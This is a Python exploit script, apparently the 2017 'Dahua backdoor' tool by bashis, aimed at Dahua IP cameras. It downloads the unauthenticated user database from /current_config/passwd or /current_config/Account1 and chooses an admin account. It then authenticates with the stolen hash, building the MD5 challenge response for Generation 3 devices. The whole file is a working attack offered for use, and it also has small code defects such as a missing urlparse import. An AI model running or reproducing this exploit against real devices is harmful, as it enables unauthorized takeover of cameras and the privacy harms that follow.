import string
import sys
import socket
import argparse
import urllib.request, urllib.parse, urllib.error, urllib.request, urllib.error, urllib.parse
import base64
import ssl
import json
import commentjson # pip install commentjson
import hashlib


class HTTPconnect:

	def __init__(self, host, proto, verbose, creds, Raw):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.Raw = Raw
	
	def Send(self, uri, query_headers, query_data,ID):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID

		# Connect-timeout in seconds
		timeout = 5
		socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			print("[Verbose] Sending:", url)

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print("[i] Creating SSL Unverified Context")
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print("[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1])
			try:
				pwd_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib.request.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib.request.build_opener(auth_handler)
				urllib.request.install_opener(opener)
			except Exception as e:
				print("[!] Basic Auth Error:",e)
				sys.exit(1)

		if self.query_data:
			request = urllib.request.Request(url, data=json.dumps(self.query_data).encode('utf-8'), headers=self.query_headers)
		else:
			request = urllib.request.Request(url, None, headers=self.query_headers)
		response = urllib.request.urlopen(request)
		# print response
		if response:
			print("[<] {} OK".format(response.code))

		if self.Raw:
			return response
		else:
			html = response.read()
			return html
class Dahua_Backdoor:

	def __init__(self, rhost, proto, verbose, creds, Raw):
		self.rhost = rhost
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.Raw = Raw

	#
	# Generation 2
	#
	def Gen2(self,response,headers):
		self.response = response.read()
		self.headers = headers

		html = self.response.readlines()
		if self.verbose:
			for lines in html:
				print ("{}".format(lines))
		#
		# Check for first availible admin user
		#
		for line in html:
			if line[0] == "#" or line[0] == "\n":
				continue
			line = line.split(':')[0:25]
			if line[3] == '1':		# Check if user is in admin group
				USER_NAME = line[1]	# Save login name
				PWDDB_HASH = line[2]# Save hash
				print("[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2]))
				break

		#
		# Login 1
		#
		print("[>] Requesting our session ID")
		query_args = {"method":"global.login",
			"params":{
				"userName":USER_NAME,
				"password":"",
				"clientType":"Web3.0"},
			"id":10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)

		json_obj = json.load(response)
		if self.verbose:
			print(json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': ')))

		#
		# Login 2
		#
		print("[>] Logging in")

		query_args = {"method":"global.login",
			"session":json_obj['session'],
			"params":{
				"userName":USER_NAME,
				"password":PWDDB_HASH,
				"clientType":"Web3.0",
				"authorityType":"OldDigest"},
			"id":10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
		print(response.read())

		#
		# Wrong username/password
		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1997483520 }
		# { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1997734656 }
		#
		# Successfull login
		# { "id" : 10000, "params" : null, "result" : true, "session" : 1626533888 }
		# 

		#
		# Logout
		#
		print("[>] Logging out")
		query_args = {"method":"global.logout",
			"session":json_obj['session'],
			"id":10001}

		URI = '/RPC2'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
		return response
	
	def Gen3(self, response, headers):
		self.response = response.read()
		self.headers = headers
		# print(self.response)
		# json_obj = commentjson.loads(self.response)
		json_string = ""
		start = False
		for x in self.response:
			if (x[0] == '{' or start == True):
				start = True
				json_string = json_string + x
		json_obj = json.loads(json_string)

		if self.verbose:
			print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))

		#
		# Check for first available admin user
		#
		for who in json_obj[list(json_obj.keys())[0]]:
			if who['Group'] == 'admin':  # Check if user is in admin group
				USER_NAME = who['Name']  # Save login name
				PWDDB_HASH = who['Password']  # Save hash
				print("[i] Choosing Admin Login: {}".format(who['Name']))
				break
		#
		# Request login
		#
		print("[>] Requesting our session ID")
		query_args = {"method": "global.login",
		              "params": {
		                  "userName": USER_NAME,
		                  "password": "",
		                  "clientType": "Web3.0"},
		              "id": 10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost, self.proto, self.verbose, self.credentials, self.Raw).Send(URI, headers, query_args, None)

		json_obj = json.load(response)
		if self.verbose:
			print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))
		#
		# Generate login MD5 hash with all required info we have downloaded
		#
		RANDOM = json_obj['params']['random']
		PASS = '' + USER_NAME + ':' + RANDOM + ':' + PWDDB_HASH + ''
		RANDOM_HASH = hashlib.md5(PASS.encode('utf-8')).hexdigest().upper()

		print("[i] Downloaded MD5 hash:", PWDDB_HASH)
		print("[i] Random value to encrypt with:", RANDOM)
		print("[i] Built password:", PASS)
		print("[i] MD5 generated password:", RANDOM_HASH)

		#
		# Login
		#
		print("[>] Logging in")

		query_args = {"method": "global.login",
		              "session": json_obj['session'],
		              "params": {
		                  "userName": USER_NAME,
		                  "password": RANDOM_HASH,
		                  "clientType": "Web3.0",
		                  "authorityType": "Default"},
		              "id": 10000}

		URI = '/RPC2_Login'
		response = HTTPconnect(self.rhost, self.proto, self.verbose, self.credentials, self.Raw).Send(URI, headers, query_args, json_obj['session'])
		print(response.read())
		# Wrong username/password
		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1156538295 }
		# { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1175812023 }
		#
		# Successfull login
		# { "id" : 10000, "params" : null, "result" : true, "session" : 1175746743 }
		#

		#
		# Logout
		#
		print ("[>] Logging out")
		query_args = {"method":"global.logout",
			"params":"null",
			"session":json_obj['session'],
			"id":10001}

		URI = '/RPC2'
		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
		return response

class Validate:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def Host(self, host):
        if not host:
            return None

        parsed = urlparse("//" + host)
        if parsed.hostname:
            return parsed.hostname

        if self.verbose:
            print("[!] Invalid RHOST - Could not parse hostname from '{}'".format(host))

        return None

    def Port(self, port):
        if not port:
            return False

        try:
            port = int(port)
            if port >= 1 and port <= 65535:
                return True

            if self.verbose:
                print("[!] Invalid RPORT - Choose between 1 and 65535")

        except ValueError:
            if self.verbose:
                print("[!] Invalid RPORT - Could not convert '{}' to an integer".format(port))

        return False
    

if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\n'
	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	raw_request = True
	rhost = '192.168.5.2'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	creds = False			# creds = 'user:pass'


#
# Try to parse all arguments
#
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		if creds:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print (INFO,"\nError: %s\n" % str(e))
		sys.exit(1)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	print ("\n[*]",INFO)

	if args.verbose:
		verbose = args.verbose
#
# Check validity, update if needed, of provided options
#
	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if creds and args.auth:
		creds = args.auth

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print ("[!] Invalid RPORT - Choose between 1 and 65535")
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print ("[!] Invalid RHOST")
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	if args.https:
		print ("[i] HTTPS / SSL Mode Selected")
	print ("[i] Remote target IP:",rhost)
	print ("[i] Remote target PORT:",rport)

	rhost = rhost + ':' + rport

	headers = {
		'X-Requested-With'	:	'XMLHttpRequest',
		'X-Request'	:	'JSON',
		'User-Agent':'Dahua/2.0; Dahua/3.0'
		}

	#
	# Try to find /current_config/passwd user database (Generation 2)
	#
	try:
		print("[>] Checking for backdoor version")
		URI = "/current_config/passwd"
		response = HTTPconnect(rhost, proto, verbose, creds, raw_request).Send(URI, headers, None, None)
		print("[!] Generation 2 found")
		response = Dahua_Backdoor(rhost, proto, verbose, creds, raw_request).Gen2(response, headers)
		print(response)
	except urllib.error.HTTPError as e:
		#
		# If not, try to find /current_config/Account1 user database (Generation 3)
		#
		if e.code == 404:
			try:
				URI = '/current_config/Account1'
				response = HTTPconnect(rhost, proto, verbose, creds, raw_request).Send(URI, headers, None, None)
				print("[!] Generation 3 Found")
				response = Dahua_Backdoor(rhost, proto, verbose, creds, raw_request).Gen3(response, headers)
			except urllib.error.HTTPError as e:
				if e.code == 404:
					print("[!] Patched or not Dahua device! ({})".format(e.code))
					sys.exit(1)
				else:
					print("Error Code: {}".format(e.code))
	except Exception as e:
		print("[!] Detect of target failed ({})".format(e))
		sys.exit(1)

	print("\n[*] All done...\n")
	sys.exit(0)
